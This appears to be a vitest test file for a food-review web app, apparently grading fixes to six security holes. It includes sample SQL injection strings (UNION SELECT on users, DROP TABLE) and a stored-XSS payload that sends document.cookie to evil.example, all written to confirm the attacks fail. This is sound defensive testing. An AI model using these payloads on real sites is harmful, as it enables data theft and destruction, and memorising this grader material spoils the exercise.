import { describe, it, expect, beforeEach } from "vitest";
import type { DatabaseSync } from "node:sqlite";
import { openDb } from "./starter/db.ts";
import { createApp, signToken } from "./starter/app.ts";
import { escapeHtml } from "./starter/html.ts";
import { createRateLimiter } from "./starter/rate-limit.ts";

const SECRET = "test-secret-please-never-leak-1234";

let db: DatabaseSync;
let app: ReturnType<typeof createApp>;
let clock: number;
let logs: string[];

beforeEach(() => {
  db = openDb();
  clock = Date.parse("2026-10-05T09:00:00Z");
  logs = [];
  app = createApp({ db, sessionSecret: SECRET, now: () => clock, log: (line) => logs.push(line) });
});

const json = (method: string, body: unknown, headers: Record<string, string> = {}) => ({
  method,
  headers: { "Content-Type": "application/json", ...headers },
  body: JSON.stringify(body),
});
const search = async (q: string) => (await (await app.request(`/reviews/search?q=${encodeURIComponent(q)}`)).json()).reviews;
const login = (email: string, password: string, headers: Record<string, string> = {}) => app.request("/login", json("POST", { email, password }, headers));

describe("the features still work", () => {
  it("searches reviews", async () => {
    expect((await search("bhajia")).map((r: { vendor: string }) => r.vendor)).toEqual(["Ngara Bhajia House"]);
    expect(await search("")).toHaveLength(3);
  });

  it("takes a review and shows it on the page", async () => {
    const created = await app.request("/reviews", json("POST", { vendor: "Mama Njeri's Smokies", author: "Dan", body: "Smokie pasua done right", stars: 5 }));
    expect(created.status).toBe(201);
    const page = await (await app.request("/reviews/page")).text();
    expect(page).toContain("Smokie pasua done right");
    expect(page).toContain("Mama Njeri&#39;s Smokies");
  });

  it("logs in, and lets you change your own name", async () => {
    const response = await login("amina@example.com", "matatu-sunset-42");
    expect(response.status).toBe(200);
    const { token } = await response.json();
    const changed = await app.request("/me", json("PATCH", { name: "Amina K" }, { Authorization: `Bearer ${token}` }));
    expect((await changed.json()).user).toEqual({ id: 1, name: "Amina K", role: "fan" });
  });
});

describe("HOLE 1: SQL injection", () => {
  it("treats ' OR 1=1 -- as text to search for, not as SQL", async () => {
    expect(await search("' OR 1=1 --")).toEqual([]);
  });

  it("can't be used to read the users table", async () => {
    const stolen = await app.request(
      `/reviews/search?q=${encodeURIComponent("zzz' UNION SELECT id, email, name, password_hash, 5 FROM users --")}`,
    );
    const text = await stolen.text();
    expect(text).not.toContain("admin@example.com");
    expect(text).not.toContain("password");
  });

  it("can't drop tables", async () => {
    await app.request(`/reviews/search?q=${encodeURIComponent("x'; DROP TABLE reviews; --")}`);
    expect(db.prepare("SELECT count(*) AS n FROM reviews").get()).toEqual({ n: 3 });
  });

  it("treats % and _ as ordinary characters", async () => {
    expect(await search("%")).toEqual([]);
    expect(await search("_")).toEqual([]);
  });
});

describe("HOLE 2: stored cross-site scripting (XSS)", () => {
  it("escapes the five special characters", () => {
    expect(escapeHtml(`<a href="x">Tom & Jerry's</a>`)).toBe("&lt;a href=&quot;x&quot;&gt;Tom &amp; Jerry&#39;s&lt;/a&gt;");
  });

  it("shows a review's script as text, never runs it", async () => {
    await app.request("/reviews", json("POST", { vendor: "<img src=x onerror=alert(1)>", author: "Mallory", body: "<script>fetch('https://evil.example/?c='+document.cookie)</script>", stars: 1 }));
    const page = await (await app.request("/reviews/page")).text();
    expect(page).not.toContain("<script>");
    expect(page).not.toContain("<img src=x");
    expect(page).toContain("&lt;script&gt;");
  });
});

describe("HOLE 3: leaking secrets", () => {
  it("has no debug route", async () => {
    const response = await app.request("/debug");
    expect(response.status).toBe(404);
    expect(await response.text()).not.toContain(SECRET);
  });

  it("answers an unexpected error with no details, and logs it for you instead", async () => {
    db.close(); // break the app on purpose
    const response = await app.request("/reviews/search?q=x");
    expect(response.status).toBe(500);
    const text = await response.text();
    expect(JSON.parse(text)).toEqual({ error: "Something went wrong on our side" });
    expect(text).not.toContain(SECRET.slice(0, 4));
    expect(logs.join("\n")).toContain("Unexpected error");
    db = openDb(); // so the next test has a working database
  });

  it("won't accept a token signed with a guessed secret", async () => {
    const forged = signToken(2, "guessed-secret");
    const response = await app.request("/me", json("PATCH", { name: "Mallory" }, { Authorization: `Bearer ${forged}` }));
    expect(response.status).toBe(401);
  });
});

describe("HOLE 4: guessing passwords", () => {
  it("limits guesses per account: the 6th wrong password in 15 minutes gets a 429", async () => {
    for (let i = 0; i < 5; i++) expect((await login("amina@example.com", `guess-${i}`)).status).toBe(401);
    const blocked = await login("amina@example.com", "matatu-sunset-42");
    expect(blocked.status).toBe(429);
    expect(Number(blocked.headers.get("Retry-After"))).toBeGreaterThan(0);
    clock += 15 * 60_000;
    expect((await login("amina@example.com", "matatu-sunset-42")).status).toBe(200);
  });

  it("limits guesses from one address, across many accounts", async () => {
    let lastStatus = 0;
    for (let i = 0; i < 25; i++) lastStatus = (await login(`person${i}@example.com`, "password")).status;
    expect(lastStatus).toBe(429);
  });

  it("doesn't let a faked X-Forwarded-For header dodge the limit", async () => {
    let lastStatus = 0;
    for (let i = 0; i < 25; i++) {
      lastStatus = (await login(`person${i}@example.com`, "password", { "X-Forwarded-For": `10.0.0.${i}` })).status;
    }
    expect(lastStatus).toBe(429);
  });

  it("clears an account's count after a successful login", async () => {
    for (let i = 0; i < 4; i++) await login("amina@example.com", `guess-${i}`);
    expect((await login("amina@example.com", "matatu-sunset-42")).status).toBe(200);
    for (let i = 0; i < 4; i++) expect((await login("amina@example.com", `oops-${i}`)).status).toBe(401);
  });

  it("has a limiter that counts per key and resets per window", () => {
    let now = 0;
    const limiter = createRateLimiter({ limit: 2, windowMs: 10_000, now: () => now });
    expect(limiter.hit("a")).toEqual({ allowed: true, remaining: 1, retryAfterSeconds: 0 });
    expect(limiter.hit("a").allowed).toBe(true);
    now = 2500;
    expect(limiter.hit("a")).toEqual({ allowed: false, remaining: 0, retryAfterSeconds: 8 });
    expect(limiter.hit("b").allowed).toBe(true);
    now = 10_000;
    expect(limiter.hit("a").allowed).toBe(true);
    limiter.reset("b");
    expect(limiter.hit("b").remaining).toBe(1);
  });
});

describe("HOLE 5: mass assignment", () => {
  it("won't let you make yourself an admin", async () => {
    const { token } = await (await login("amina@example.com", "matatu-sunset-42")).json();
    const response = await app.request("/me", json("PATCH", { name: "Amina", role: "admin" }, { Authorization: `Bearer ${token}` }));
    expect((await response.json()).user.role).toBe("fan");
    expect(db.prepare("SELECT role FROM users WHERE id = 1").get()).toEqual({ role: "fan" });
  });
});

describe("HOLE 6: security headers", () => {
  it("sends the headers every page should have", async () => {
    const response = await app.request("/reviews/page");
    expect(response.headers.get("X-Content-Type-Options")).toBe("nosniff");
    expect(response.headers.get("X-Frame-Options")).toBeTruthy();
    expect(response.headers.get("Strict-Transport-Security")).toContain("max-age=");
    expect(response.headers.get("Referrer-Policy")).toBe("no-referrer");
  });

  it("has a Content Security Policy that blocks injected scripts", async () => {
    const csp = (await app.request("/reviews/page")).headers.get("Content-Security-Policy") ?? "";
    expect(csp).toContain("script-src 'self'");
    expect(csp).not.toContain("unsafe-inline");
    expect(csp).toContain("frame-ancestors 'none'");
  });
});
